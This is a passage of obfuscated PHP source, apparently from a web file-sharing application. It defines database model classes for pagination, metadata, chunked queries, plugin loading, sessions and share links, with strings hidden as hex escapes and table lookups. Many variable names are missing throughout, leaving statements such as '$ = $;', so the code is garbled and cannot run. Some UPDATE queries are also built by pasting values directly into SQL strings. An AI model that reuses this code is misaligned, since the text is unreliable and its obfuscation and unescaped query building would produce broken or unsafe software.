($ === -1) { $in[$ʮ[415]] = !1; $ = 100000000; $ = $; } $ɥ = $ǈ; $ɥ[$ʮ[417]] = array(); $ = intval($); $ = $ <= 5 ? 5 : ($ >= $ ? $ : $); $ = intval(isset($in[$ʮ[405]]) && $in[$ʮ[405]] ? $in[$ʮ[405]] : $); $ = $ <= 1 ? 1 : $; $Ƞ = array(); $Є㦏 = 1; if ($ == 1 && $Є㦏) { $this->optionsValue($ǈ); $Ƞ = $this->page($, $)->select(); $㎶ = is_array($Ƞ) ? count($Ƞ) : 0; if ($㎶ < $) { $ҳ = 1; } else { $this->optionsValue($ɥ); $㎶ = intval($this->count()); $ҳ = ceil($㎶ / $); } } else { $this->optionsValue($ɥ); $㎶ = intval($this->count()); $ҳ = ceil($㎶ / $); $ = $ >= $ҳ ? $ҳ : $; $this->optionsValue($ǈ); $Ƞ = $this->page($, $)->select(); } if (!is_array($Ƞ)) { $Ƞ = array(); } if ($ҳ == 1) { $㎶ = count($Ƞ); } $൐ = array($ʮ[418] => array($ʮ[419] => $㎶, $ʮ[415] => $, $ʮ[405] => $, $ʮ[420] => $ҳ), $ʮ[421] => $Ƞ); return $൐; } protected function checkLength($ł, $ˆ = 0, $昸 = '') { $Ң =& $_SERVER[ʯ]; $ˆ = $ˆ ? $ˆ : 65536; if (!$ł || strlen($ł) < $ˆ) { return; } $昸 = $昸 ? $昸 . $Ң[81] : $Ң[12]; show_json($昸 . LNG($Ң[422]) . "\x28{$ˆ}\51", !1); } protected function metaSet($㟊, $ܳ = null, $ = null) { $ =& $_SERVER[ʯ]; if (!$this->tableMeta || !$㟊) { return !1; } $ = $this->tableMeta[$[423]]; $ = $this->tableMeta[$[424]]; $ێ = Model($); $ = array($ => $㟊, $[425] => $ܳ); if (is_null($ܳ)) { return $ێ->where(array($ => $㟊))->delete(); } if (is_null($) && is_string($ܳ)) { return $ێ->where($)->delete(); } $΃ = is_array($ܳ) ? $ܳ : array(); if (is_string($ܳ)) { $΃[$ܳ] = $; } $돹 = array(); foreach ($΃ as $ => $) { if (is_null($) && is_string($)) { $ێ->where(array($ => $㟊, $[425] => $))->delete(); continue; } $this->checkLength($, !1, $ . $[4] . $); $돹[] = array($ => $㟊, $[104] => $, $[426] => $); } $Ё = $[427] . $; CacheLock::lock($Ё); $ێ->where(array($ => $㟊))->addAll($돹, array(), !0); CacheLock::unlock($Ё); return !0; } public function metaGet($, $ꓷ = false) { $˺ =& $_SERVER[ʯ]; if (!$this->tableMeta) { return array(); } $ = $this->tableMeta[$˺[423]]; $凟 = Model($this->tableMeta[$˺[424]]); if ($ꓷ) { $̷ɓ = array($ => $, $˺[104] => $ꓷ); return $凟->where($̷ɓ)->getField($˺[426]); } $̷ɓ = array($ => $); $ = $凟->field($˺[428])->where($̷ɓ)->select(); $ = array_to_keyvalue($, $˺[104], $˺[426]); return $; } private function checkDataAutoHas($ኞ) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $) { if (in_array($ኞ, explode($_SERVER[ʯ][60], $[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$퇓, $Ԅ) { $曏 =& $_SERVER[ʯ]; if (!is_array($퇓)) { return; } foreach ($this->dataAuto as $) { $Э = $[0]; if (!in_array($Ԅ, explode($曏[60], $[2]))) { continue; } switch (trim($[3])) { case $曏[373]: case $曏[374]: $ = $[1]; $ۢ = isset($[4]) ? (array) $[4] : array(); if ($ == $曏[203] && array_key_exists($Э, $퇓)) { if (!$퇓[$Э]) { unset($퇓[$Э]); } break; } if (isset($퇓[$Э])) { array_unshift($ۢ, $퇓[$Э]); } if ($曏[373] == $[3]) { $퇓[$Э] = call_user_func_array($, $ۢ); } else { $퇓[$Э] = call_user_func_array(array(&$this, $), $ۢ); } break; case $曏[322]: if (isset($퇓[$Э]) && $퇓[$Э]) { $퇓[$Э] = call_user_func_array(array(&$this, $[1]), array($퇓[$Э])); } break; case $曏[325]: $퇓[$Э] = $퇓[$[1]]; break; case $曏[346]: if (isset($퇓[$Э]) && !is_string($퇓[$Э])) { $퇓[$Э] = json_encode_force($퇓[$Э]); } break; case $曏[375]: if ($퇓[$Э] === $曏[12]) { unset($퇓[$Э]); } break; case $曏[376]: $퇓[$Э] = $[1]; default: break; } } if ($Ԅ == $曏[407]) { $ɞ = strtolower($this->db->getDbType()); if (strpos($ɞ, $曏[23]) !== 0) { return; } $ = $this->field(!0)->fields; $ʙ = $[$曏[304]]; if (isset($[$曏[303]])) { unset($ʙ[$[$曏[303]]]); } foreach ($ʙ as $ => $Ԅ) { if (!isset($퇓[$])) { $퇓[$] = $曏[12]; } } } } private function dataAfterFilter(&$Ŀ) { $ =& $_SERVER[ʯ]; foreach ($this->dataAuto as $) { $¨ = $[0]; if (!isset($Ŀ[$¨])) { continue; } if (!in_array($[409], explode($[60], $[2]))) { continue; } switch (trim($[3])) { case $[373]: case $[374]: $͚ = isset($[4]) ? (array) $[4] : array(); array_unshift($͚, $Ŀ[$¨]); if (isset($[4]) && $[4] == $[429]) { $͚ = array($Ŀ[$¨]); } if ($[373] == $[3]) { $Ŀ[$¨] = call_user_func_array($[1], $͚); } else { $Ŀ[$¨] = call_user_func_array(array(&$this, $[1]), $͚); } break; case $[322]: if (isset($Ŀ[$¨]) && $Ŀ[$¨]) { $Ŀ[$¨] = call_user_func_array(array(&$this, $[1]), array($Ŀ[$¨])); } break; case $[325]: $Ŀ[$¨] = $Ŀ[$[1]]; break; case $[346]: $ꒉ = $Ŀ[$¨]; $Ŀ[$¨] = json_decode($ꒉ, !0); if (is_null($Ŀ[$¨])) { $Ŀ[$¨] = $ꒉ; } break; case $[375]: if ($Ŀ[$¨] === $[12]) { unset($Ŀ[$¨]); } break; case $[376]: $Ŀ[$¨] = $[1]; break; default: break; } } } public function saveAll($) { $톏 =& $_SERVER[ʯ]; $ = $this->tablePrefix . $this->tableName; $ = self::SQL_WHERE_IN_CHUNK; $ = is_array($) ? $ : array(); $ϭ = $톏[430]; $ = 0; $Ի = array(); $ì = count($); for ($Ů = 0; $Ů < $ì; $Ů++) { $ = $[$Ů]; if (!is_array($) || count($) != 4) { continue; } $ = "\x55\120\x44\x41\124\x45\40\x60{$}\140\40\x53\x45\x54\40{$[2]}\x20\75\40\x43\x41\123\105\40{$[0]}\40\xa"; if ($ == 0) { $ϭ = $; } $Ի[] = $톏[128] . $[1] . $톏[128]; $++; $ϭ .= "\x20\127\110\105\116\40\x27{$[1]}\x27\40\124\110\x45\116\x20\47{$[3]}\47\40\12"; if ($ == $ || $Ů == $ì - 1) { $ = implode($톏[60], $Ի); $ϭ .= "\x20\x45\116\x44\x20\x20\127\x48\105\122\105\40{$[0]}\x20\111\x4e\40\x28{$}\51\40"; $this->execute($ϭ); $ = 0; $ϭ = $; $this->chunkEventCheck(count($Ի)); $Ի = array(); } } $this->chunkEventSet(); } public function saveAllEach($҄) { $ =& $_SERVER[ʯ]; $Ί = $this->tablePrefix . $this->tableName; foreach ($҄ as $Ƒ) { if (!is_array($Ƒ) || count($Ƒ) != 4) { continue; } $ = $Ƒ[0] . $[431] . $Ƒ[1] . $[128]; $ۑ = $Ƒ[2] . $[431] . $Ƒ[3] . $[128]; $朁 = "\x75\160\x64\141\x74\x65\x20{$Ί}\40\x73\145\x74\40{$ۑ}\40\167\150\x65\162\x65\x20{$}\x3b"; $this->execute($朁); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($ = false, $ = false) { $this->_chunkEvent = $; $this->_chunkEventParam = $; } private function chunkEventCheck($ԃ) { if (!$this->_chunkEvent) { return; } $ď = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $ď[$_SERVER[ʯ][432]] = $ԃ; Hook::trigger($this->_chunkEvent, $ď); } public function addAll($ӷ, $Ը = array(), $͐ = false) { $ܛ =& $_SERVER[ʯ]; ignore_timeout(); $̬婶 = self::SQL_WHERE_IN_CHUNK; if (empty($ӷ)) { $this->error = think_lang($ܛ[323]); return !1; } $Ը = $this->_parseOptions($Ը); foreach ($ӷ as $׼ => $蝐) { $ӷ[$׼] = $this->_facade($蝐); $this->_beforeInsert($ӷ[$׼], $Ը); } if (method_exists($this->db, $ܛ[324])) { for ($ܺ = 0; $ܺ < count($ӷ); $ܺ += $̬婶) { $ڶ׷ = array_slice($ӷ, $ܺ, $̬婶); if (!is_array($ڶ׷) || count($ڶ׷) == 0) { break; } $ = $this->db->insertAll($ڶ׷, $Ը, $͐); $this->chunkEventCheck(count($ڶ׷)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($ӷ as $׼ => $蝐) { $ = $this->db->insert($蝐, $Ը, $͐); } $this->commit(); } if (!1 !== $) { $׉Ŗ = $this->getLastInsID(); if ($׉Ŗ) { return $׉Ŗ; } } return $; } public function save($گ嶶 = '', $Վ = array()) { $丵 =& $_SERVER[ʯ]; $ʆ = self::SQL_WHERE_IN_CHUNK; $ĉ = $this->optionsValue(); $ = $this->findWhereField($ĉ); if (!$) { return parent::save($گ嶶, $Վ); } $ż = 0; $ = $ĉ[$丵[327]][$][1]; $ = is_array($) ? $ : array(); $Ѐ = count($); for ($ܺ = 0; $ܺ < $Ѐ; $ܺ += $ʆ) { $Ɠ = array_slice($, $ܺ, $ʆ); if (!is_array($Ɠ) || count($Ɠ) == 0) { break; } $ĉ[$丵[327]][$][1] = $Ɠ; $this->optionsValue($ĉ); $ż += parent::save($گ嶶, $Վ); $this->chunkEventCheck(count($Ɠ)); } $this->chunkEventSet(); return $ż; } public function add($ = '', $ = array(), $˃ߧ = false) { if ($this->addTaskStatus && is_array($)) { $this->addTaskData[] = $; return; } return parent::add($, $, $˃ߧ); } public function parseWhereLike($픨, $ = '', $ه = false, &$𾒿 = false) { $ђ =& $_SERVER[ʯ]; $ݓԉ = $GLOBALS[$ђ[6]][$ђ[433]]; if (!$ݓԉ[$ђ[434]]) { return $픨; } if (!is_array($픨)) { return $픨; } $ћ = array(); $ = 0; foreach ($픨 as $ﴍ => $ڽ) { if (is_array($ڽ) && count($ڽ) == 2 && $ڽ[0] == $ђ[435] && is_string($ڽ[1]) && substr($ڽ[1], 0, 1) == $ђ[436] && substr($ڽ[1], strlen($ڽ[1]) - 1, 1) == $ђ[436]) { $𾒿 = !0; $֭Λ = is_string($ﴍ) ? $ﴍ : $; $Т = substr($ڽ[1], 1, strlen($ڽ[1]) - 2); $Т = $this->db->escapeString($Т); if (!strpos($֭Λ, $ђ[10])) { $֭Λ = $ђ[437] . $֭Λ . $ђ[437]; } $ = $ђ[212] . $Т . $ђ[212]; $Т = str_replace(array($ђ[10], $ђ[438], $ђ[11]), $ђ[439], $Т); if ($ݓԉ[$ђ[440]]) { $ = $ђ[441] . $Т . $ђ[442]; if ($ݓԉ[$ђ[443]]) { $ = $ђ[442] . $Т . $ђ[441]; } } $ћ[$] = $ђ[444] . $֭Λ . $ђ[445] . $ . $ђ[446]; $++; continue; } if (is_array($ڽ)) { $ = is_string($ﴍ) ? $ﴍ : $; $ڽ = $this->parseWhereLike($ڽ, $, !0, $𾒿); } if (is_numeric($ﴍ)) { $ћ[$] = $ڽ; $++; } else { $ћ[$ﴍ] = $ڽ; } } if ($𾒿 && !$ه) { } return $ћ; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($ = array()) { $ =& $_SERVER[ʯ]; $۸ = self::SQL_WHERE_IN_CHUNK; $ԃ = $this->optionsValue(); $ҥ = $this->findWhereField($ԃ); if (!$ҥ || isset($ԃ[$[344]]) || isset($ԃ[$[405]])) { return parent::select($); } $뎍 = $ԃ[$[327]][$ҥ][1]; $뎍 = is_array($뎍) ? $뎍 : array(); $ = null; for ($ӭ = 0; $ӭ < count($뎍); $ӭ += $۸) { $Δ = array_slice($뎍, $ӭ, $۸); if (!is_array($Δ) || count($Δ) == 0) { break; } $ԃ[$[327]][$ҥ][1] = $Δ; $this->optionsValue($ԃ); $ɉ = parent::select($); if (!$ɉ) { continue; } $ = is_array($) ? $ : array(); $ = array_merge($, $ɉ); } return $; } public function delete($Ԟ = array()) { $ =& $_SERVER[ʯ]; $ = self::SQL_WHERE_IN_CHUNK; $ = $this->optionsValue(); $ߕ = $this->findWhereField($); if (!$ߕ) { return parent::delete($Ԟ); } $β = 0; $⎼ = $[$[327]][$ߕ][1]; $⎼ = is_array($⎼) ? $⎼ : array(); for ($ = 0; $ < count($⎼); $ += $) { $ = array_slice($⎼, $, $); if (!is_array($) || count($) == 0) { break; } $[$[327]][$ߕ][1] = $; $this->optionsValue($); $β += parent::delete($Ԟ); } return $β; } private function findWhereField($ܺ) { $ညө =& $_SERVER[ʯ]; $ = self::SQL_WHERE_IN_CHUNK; if (!is_array($ܺ) || !is_array($ܺ[$ညө[327]])) { return !1; } foreach ($ܺ[$ညө[327]] as $ => $ߋ) { if (is_array($ߋ) && isset($ߋ[0]) && is_string($ߋ[0]) && strtolower($ߋ[0]) == $ညө[7] && is_array($ߋ[1]) && count($ߋ[1]) > $) { ignore_timeout(); return $; } } return !1; } public function setMasterDB($۱ = true) { think_config($_SERVER[ʯ][447], $۱); } } goto B򾫿; d蚊: class PluginModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\x65\155\56\160\x6c\x75\147\x69\156\114\151\x73\x74"; public $field = array("\x6e\141\x6d\145", "\163\164\x61\x74\x75\163", "\162\x65\x67\x69\x65\x73\x74", "\143\x6f\156\146\x69\x67"); public function loadList($׫ = false) { $ѥޏ = array_to_keyvalue($this->listData(), $_SERVER[ʯ][42]); if ($׫) { return $ѥޏ[$׫]; } return $ѥޏ; } public function init() { $ =& $_SERVER[ʯ]; Hook::trigger($[2016]); $ї = $this->loadPluginList(); foreach ($ї as $㾝 => $޺) { $ = $this->appAllow($㾝, $޺); if (!$) { continue; } foreach ($޺[$[2017]] as $Ȇ => $ȁ) { Hook::bind($Ȇ, $ȁ); } } Hook::trigger($[2018]); Hook::trigger(ACTION); } public function appAllow($ߵ܌, $, $ޗ = true) { $ջ =& $_SERVER[ʯ]; $Ԟ = PLUGIN_DIR . $ߵ܌ . $ջ[2019]; if (!is_array($) || !is_array($[$ջ[2017]]) || $[$ջ[810]] != 1 || !is_file($Ԟ)) { return !1; } if ($GLOBALS[$ջ[544]] == 1) { if ($GLOBALS[$ջ[6]][$ջ[2020]] || !$GLOBALS[$ջ[6]][$ջ[2021]]) { return !0; } $Ҳ = explode($ջ[60], strtolower($GLOBALS[$ջ[6]][$ջ[2021]])); return in_array(strtolower($ߵ܌), $Ҳ) ? !1 : !0; } if ($ޗ && !Action($ջ[2022])->checkAuth($ߵ܌)) { return !1; } return !0; } public function unInstall($) { $ =& $_SERVER[ʯ]; $а = $this->loadList($); if (file_exists(PLUGIN_DIR . $)) { Hook::apply($ . $[2023]); } $this->remove($а[$[451]]); } public function changeStatus($, $➨) { $ =& $_SERVER[ʯ]; $ = $this->loadList($); if ($➨) { Hook::apply($ . $[2024]); } $this->update($[$[451]], array($[2025] => $➨)); } public function appRegist($ς㘍, $՝) { $ =& $_SERVER[ʯ]; $ = $this->loadList($ς㘍); if ($) { $this->update($[$[451]], array($[2017] => $՝)); } else { $ = array($[42] => $ς㘍, $[2017] => $՝, $[810] => 0, $[6] => $this->getConfigDefault($ς㘍)); $this->insert($); } } public function getConfigDefault($) { $ =& $_SERVER[ʯ]; $ = array(); $ = $this->getPackageJson($); if (!$ && is_array($[$[2026]])) { return $; } foreach ($[$[2026]] as $Ȯԕ => $) { if (!isset($[$[426]]) || isset($[$Ȯԕ])) { continue; } $[$Ȯԕ] = $[$[426]]; } return $; } public function getPackageJson($ဤ) { return Hook::apply($ဤ . $_SERVER[ʯ][2027]); } public function getConfig($, $ = false) { $ =& $_SERVER[ʯ]; $ = array(); $ = $this->loadList($); if ($ && is_array($[$[6]])) { $ = $[$[6]]; } if (!$ || $) { $ = $this->getConfigDefault($); } return $; } public function setConfig($, $ = false) { $⿤ =& $_SERVER[ʯ]; $ = $this->loadList($); if (!$) { return !1; } $ѸД = $[$⿤[6]]; if ($ == !1) { $ѸД = array(); $ = $this->getConfigDefault($); } foreach ($ as $⫢ => $݇) { $ѸД[$⫢] = is_string($݇) ? trim($݇) : $݇; } $this->update($[$⿤[451]], array($⿤[6] => $ѸД)); } public function viewList() { $˪ =& $_SERVER[ʯ]; $г = $this->loadList(); $this->pluginScan($г); $г = $this->loadPluginList(); $Н = array(); foreach ($г as $ => $Ǩ) { unset($Ǩ[$˪[2017]], $Ǩ[$˪[6]]); $޴ = PLUGIN_DIR . $Ǩ[$˪[42]] . $˪[2019]; if (!is_file($޴)) { continue; } $κ = Hook::apply($Ǩ[$˪[42]] . $˪[2027]); if (is_array($κ)) { $Н[$] = array_merge($Ǩ, $κ); } } return $Н; } private function loadPluginList() { $Ğ =& $_SERVER[ʯ]; $ = $this->loadList(); if (strtolower(MOD) == $Ğ[2028]) { return $; } $蔀 = Hook::trigger($Ğ[2029], $); if ($ && !$蔀) { die; } return $蔀 ? $蔀 : $; } private function pluginScan($̯) { $Ĩ =& $_SERVER[ʯ]; recursion_dir(PLUGIN_DIR, $, $۟, 0); foreach ($ as $Ũ) { $ٞ = get_path_this($Ũ); if (isset($̯[$ٞ]) || !file_exists($Ũ . $Ĩ[2030]) || !file_exists($Ũ . $Ĩ[2019])) { continue; } Hook::apply($ٞ . $Ĩ[2024]); } } } class SessionModel extends ModelBase { protected $tableName = "\x73\171\x73\x74\145\155\x5f\x73\145\x73\x73\x69\x6f\156"; public function get($ڋ) { $Ŭ =& $_SERVER[ʯ]; $ = $this->where(array($Ŭ[2031] => $ڋ))->find(); if (!is_array($)) { return !1; } return $[$Ŭ[814]]; } public function set($Ɂ܌, $Ŧ, $ = 3600) { $˟ =& $_SERVER[ʯ]; $ꙮ = array($˟[2031] => $Ɂ܌, $˟[1935] => $Ŧ, $˟[2032] => $ + time()); if (Session::get($˟[2033])) { $ꙮ[$˟[1704]] = Session::get($˟[2033]); } else { $ꙮ[$˟[1704]] = 0; } if ($this->get($Ɂ܌)) { return $this->where(array($˟[2031] => $Ɂ܌))->save($ꙮ); } else { return $this->add($ꙮ, array(), !0); } } public function remove($Է) { return $this->where(array($_SERVER[ʯ][2031] => $Է))->delete(); } public function clearTimeout() { return $this->where($_SERVER[ʯ][2034] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\163\150\141\162\x65"; protected $dataAuto = array(array("\x6d\157\x64\x69\146\x79\124\151\155\x65", "\164\x69\155\145", "\151\x6e\x73\145\x72\164\x2c\x75\160\x64\x61\164\x65", "\x66\x75\x6e\x63\164\151\x6f\156"), array("\143\x72\145\141\x74\x65\124\151\155\145", "\164\151\155\145", "\151\156\x73\x65\162\x74", "\x66\x75\x6e\x63\x74\x69\157\156"), array("\x6f\x70\x74\151\x6f\x6e\163", '', "\151\x6e\163\145\x72\164\x2c\x75\x70\144\x61\164\145\54\x73\x65\154\145\143\x74", "\152\163\x6f\156")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($꾝) { $Ԩ =& $_SERVER[ʯ]; $츦 = isset($꾝[0]) ? $꾝[0] : !1; return array($Ԩ[2035] => array(USER_ID, $Ԩ[2036]), $Ԩ[1976] => array($츦, $Ԩ[2037])); } protected function listSimple() { $Ý = array($_SERVER[ʯ][1704] => USER_ID); $ = $this->field($this->fieldList)->where($Ý)->select(); return $ ? $ : array(); } protected function getInfo($́, $ = false) { $ȅ肀 =& $_SERVER[ʯ]; if ($) { return $this->_getShareInfo(array($ȅ肀[641] => $́)); } $人Ͳ = $this->cacheFunctionGet($ȅ肀[1978], $́); return $人Ͳ; } public function getInfoByHash($) { return $this->_getShareInfo(array($_SERVER[ʯ][2038] => $)); } public function getInfoByPath($) { $ =& $_SERVER[ʯ]; $Ј = array($[1704] => USER_ID, $[190] => $); return $this->_getShareInfo($Ј); } public function getInfoBySourcePath($ߥ) { $Ҡ =& $_SERVER[ʯ]; $ţ = array($Ҡ[1704] => USER_ID, $Ҡ[1236] => $ߥ); return $this->_getShareInfo($ţ); } private function _getShareInfo($돨) { $ =& $_SERVER[ʯ]; $կ = $this->where($돨)->find(); if (!$կ) { return !1; } $돨 = array($[641] => $կ[$[641]]); $ũ = $[2039]; $ݱ = Model($[642])->order($[451])->field($ũ)->where($돨)->select(); if ($կ[$[190]] == $[221]) { $կ[$[97]] = IO::info($կ[$[1236]]); } else { $կ[$[97]] = Model($[1393])->pathInfo($կ[$[190]]); } $կ[$[2040]] = $ݱ; return $կ; } protected function getInfoAuth($) { $ͼ =& $_SERVER[ʯ]; $ӑ = $this->getInfo($); if ($ӑ[$ͼ[1704]] == USER_ID) { $ӑ[$ͼ[463]] = $ӑ[$ͼ[97]][$ͼ[463]]; } else { $ӑ[$ͼ[463]] = Model($ͼ[543])->authMake($ӑ[$ͼ[2040]]); } return $ӑ; } protected function listData($Ļ = null, $۞ = 300) { $ɞ =& $_SERVER[ʯ]; $ۗ = array(array($ɞ[538] => array($ɞ[1073], 0), $ɞ[639] => array($ɞ[1073], 0), $ɞ[2041] => $ɞ[1994])); if ($Ļ == $ɞ[2042]) { $ۗ = array($ɞ[538] => 1); } else { if ($Ļ == $ɞ[1222]) { $ۗ = array($ɞ[639] => 1); } } $ۗ[$ɞ[1704]] = USER_ID; $ޖ = $this->where($ۗ)->selectPage($۞); return $ޖ; } protected function listToMe($ = 300) { $ղ =& $_SERVER[ʯ]; $ = Model($ղ[2043])->userGroupParents(USER_ID); $؍ = array($ղ[624] => SourceModel::TYPE_USER, $ղ[546] => USER_ID); if ($) { $؍ = array(array($ղ[624] => SourceModel::TYPE_USER, $ղ[546] => USER_ID), array($ղ[624] => SourceModel::TYPE_GROUP, $ղ[546] => array($ղ[7], $)), $ղ[2041] => $ղ[1994]); } $ = Model($ղ[642])->where($؍)->selectPage($); $ˀ = array_to_keyvalue_group($[$ղ[421]], $ղ[641]); if (!$ˀ) { return $; } $ɺ = $ղ[2044]; $؍ = array($ղ[641] => array($ղ[468], array_keys($ˀ)), $ղ[1704] => array($ղ[1075], $ղ[221])); $ř = $this->field($ɺ)->where($؍)->select(); foreach ($ř as $Š => &$Ň) { $Ň[$ղ[2040]] = $ˀ[$Ň[$ղ[641]]]; } unset($Ň); $ԩ = array($ղ[2045] => $ř, $ղ[2046] => $[$ղ[418]]); return $ԩ; } protected function shareAdd($ǻ, $׻) { $ =& $_SERVER[ʯ]; $ = $this->_addShareData($ǻ, $׻); if (!empty($׻[$[2047]])) { $this->_shareAuthSet($, $׻[$[2047]]); } $this->shareEventAdd($ǻ, $׻, $[2048]); return $; } protected function shareAddSystem($¢, $֢) { $־ =& $_SERVER[ʯ]; $ = $this->_addShareData($¢, $֢, $־[188]); $this->_shareAuthSet($, $֢[$־[2047]]); return $; } private function shareEventAdd($ն, $ȅ, $ = "\141\144\144") { $ =& $_SERVER[ʯ]; if (!$ն || $ն == $[221]) { return; } if ($ == $[2048]) { if ($ȅ[$[538]] == $[98]) { Model($[609])->eventShare($ն, $[2049]); } if ($ȅ[$[639]] == $[98]) { Model($[609])->eventShare($ն, $[2050]); } return; } $ٙ = $this->getInfoByPath($ն); $ꁿ = $[2051]; if ($ٙ[$[538]] == $[221] && $ȅ[$[538]] == $[98]) { $ꁿ = $[2049]; } if ($ٙ[$[538]] == $[98] && $ȅ[$[538]] == $[221]) { $ꁿ = $[2052]; } if ($ٙ[$[639]] == $[221] && $ȅ[$[639]] == $[98]) { $ꁿ = $[2050]; } if ($ٙ[$[639]] == $[98] && $ȅ[$[639]] == $[221]) { $ꁿ = $[2053]; } Model($[609])->eventShare($ն, $ꁿ); return; } private function _addShareData($Ȅ, $ش = array(), $ߐ = false) { $程 =& $_SERVER[ʯ]; $ = $ߐ == $程[188] ? 0 : USER_ID; $界 = array($程[467] => $Ȅ, $程[1695] => $); if ($Ȅ == 0) { $界 = array($程[2054] => $ش[$程[1236]], $程[1695] => $); } if ($Ԗ = $this->where($界)->find()) { return $Ԗ[$程[641]]; } if ($Ȅ == 0) { $ = array($程[42] => get_path_this($ش[$程[94]])); } else { $ = Model($程[885])->sourceInfo($Ȅ); if (!$) { return !1; } } if (!$ش[$程[1601]]) { $ش[$程[1601]] = $[$程[42]]; } $ڿ = array($程[1695] => $, $程[467] => $Ȅ, $程[1601] => $程[12], $程[538] => 0, $程[639] => 0, $程[1236] => $程[12], $程[359] => $程[12], $程[950] => $程[12], $程[2055] => 0, $程[2056] => 0, $程[821] => 0, $程[2057] => $程[12], $程[2038] => $程[12]); $ң = explode($程[60], $程[2058]); foreach ($ң as $̡) { if (!isset($ش[$̡])) { continue; } $ڿ[$̡] = $ش[$̡]; } $ = $this->add($ڿ); $آ = array($程[2038] => short_id($)); $this->where(array($程[2059] => $))->save($آ); return $; } private function _shareAuthSet($Α, $) { $ =& $_SERVER[ʯ]; if (!is_array($)) { return !1; } $Ȍ = Model($[2004]); $Ȍ->where(array($[641] => $Α))->delete(); $ = array(); foreach ($ as $) { $ = SourceModel::TYPE_USER; if ($[$[187]] == SourceModel::TYPE_GROUP) { $ = SourceModel::TYPE_GROUP; } $ = array($[641] => $Α, $[187] => $, $[546] => intval($[$[546]]), $[2000] => 0, $[2060] => -1); if ($[$[2000]]) { $[$[2000]] = $[$[2000]]; } else { if ($[$[2060]]) { $[$[2060]] = $[$[2060]]; } } $[] = $; } return $Ȍ->addAll($, array(), !0); } public function numViewAdd($) { $ =& $_SERVER[ʯ]; $ = array($[2059] => $); $this->where($)->setAdd($[2055]); } public function numDownloadAdd($) { $ʂ =& $_SERVER[ʯ]; $ = array($ʂ[2059] => $); $this->where($)->setAdd($ʂ[2056]); } protected function shareEdit($, $儑) { $զ =& $_SERVER[ʯ]; $ = $this->getInfo($); if (!$) { return !1; } $this->_checkLinkShare($儑, $); $׼ = array(); $Ğ = explode($զ[60], $զ[2061]); foreach ($Ğ as $Ҍ) { if (!array_key_exists($Ҍ, $儑)) { continue; } $׼[$Ҍ] = $儑[$Ҍ]; } $this->shareEventAdd($[$զ[190]], $儑, $զ[1866]); $this->where(array($զ[2059] => $))->save($׼); if (isset($儑[$զ[2047]])) { $this->_shareAuthSet($, $儑[$զ[2047]]); } return !0; } private function _checkLinkShare($̃, $М瀬) { $ّ =& $_SERVER[ʯ]; if ($̃[$ّ[538]] != $ّ[98]) { return; } $ = $М瀬[$ّ[97]][$ّ[190]]; if ($М瀬[$ّ[97]][$ّ[43]] != $ّ[223]) { $ = $this->_folderReport($); if (!$) { return; } show_json(LNG($ّ[2062]) . $ّ[2063] . $, !1); } $ο = Model($ّ[885])->fileInfoGet($М瀬[$ّ[97]][$ّ[190]]); if (!$ο) { return; } $ = $this->shareFileMeta($ο[$ّ[517]]); if (isset($[$ّ[426]]) && $[$ّ[426]] == $ّ[98]) { show_json(LNG($ّ[2064]), !1); } } private function _folderReport($) { $ =& $_SERVER[ʯ]; $Ҷ = array($[517] => array($[1073], 0), $[810] => 3); $ = Model($[2065])->where($Ҷ)->field($[517])->select(); if (!$) { return !1; } $ = array_to_keyvalue($, $[12], $[517]); $Ⱥ = $[60] . $ . $[60]; $Ҷ = array($[517] => array($[7], $), $[561] => array($[435], "\45{$Ⱥ}\45"), $[481] => 0); $큃 = Model($[885])->where($Ҷ)->field($[2066])->find(); if (!$큃) { return !1; } $ = substr($큃[$[561]], strpos($큃[$[561]], $Ⱥ)); $Ҷ = array($[190] => array($[7], trim($, $[60]))); $ڦ = Model($[885])->where($Ҷ)->field($[42])->select(); $ = array_to_keyvalue($ڦ, $[12], $[42]); $[] = $큃[$[42]]; return implode($[8], $); } protected function remove($) { $ =& $_SERVER[ʯ]; if (is_array($)) { $ = array($[7], $); } $ݳ = array($[641] => $); $ = $this->where($ݳ)->delete(); if ($) { Model($[642])->where(array($[641] => $))->delete(); } $Ơ = is_array($) ? $[1] : array($); for ($ = 0; $ < count($Ơ); $++) { $ʍ = $this->getInfo($Ơ[$]); if ($ʍ[$[639]] == $[98]) { Model($[609])->eventShare($ʍ[$[190]], $[2053]); } if ($ʍ[$[538]] == $[98]) { Model($[609])->eventShare($ʍ[$[190]], $[2052]); } } return $; } protected function removeBySource($) { $଀ =& $_SERVER[ʯ]; $ = array($଀[467] => array($଀[468], $)); $񻞝 = $this->field($଀[641])->where($)->select(); $񻞝 = array_to_keyvalue($񻞝, $଀[12], $଀[641]); if (!$񻞝) { return; } $ = array($଀[2059] => array($଀[468], $񻞝)); $this->where($)->delete(); Model($଀[642])->where($)->delete(); } public function listAll($阔Ł) { $ҹ =& $_SERVER[ʯ]; $ = array(); if ($阔Ł[$ҹ[1704]]) { $[$ҹ[1704]] = $阔Ł[$ҹ[1704]]; } if ($阔Ł[$ҹ[820]]) { $ = $阔Ł[$ҹ[821]] ? $阔Ł[$ҹ[821]] : strtotime(date($ҹ[2067])); $[$ҹ[224]] = array($ҹ[385], array($阔Ł[$ҹ[820]], $)); } if ($阔Ł[$ҹ[43]]) { $[$阔Ł[$ҹ[43]]] = 1; } else { $[] = array($ҹ[538] => array($ҹ[1073], 0), $ҹ[639] => array($ҹ[1073], 0), $ҹ[2041] => $ҹ[1994]); } if ($阔Ł[$ҹ[1990]]) { $[] = array($ҹ[2038] => $阔Ł[$ҹ[1990]], $ҹ[1601] => array($ҹ[435], "\45{$阔Ł[$ҹ[1990]]}\x25"), $ҹ[2041] => $ҹ[1994]); } $ = $this->_makeOrder()->where($)->selectPage(20); if (empty($[$ҹ[421]])) { return array(); } $this->_listDataApply($[$ҹ[421]]); return $; } public function listDataApply($ś) { $this->_listDataApply($ś); return $ś; } private function 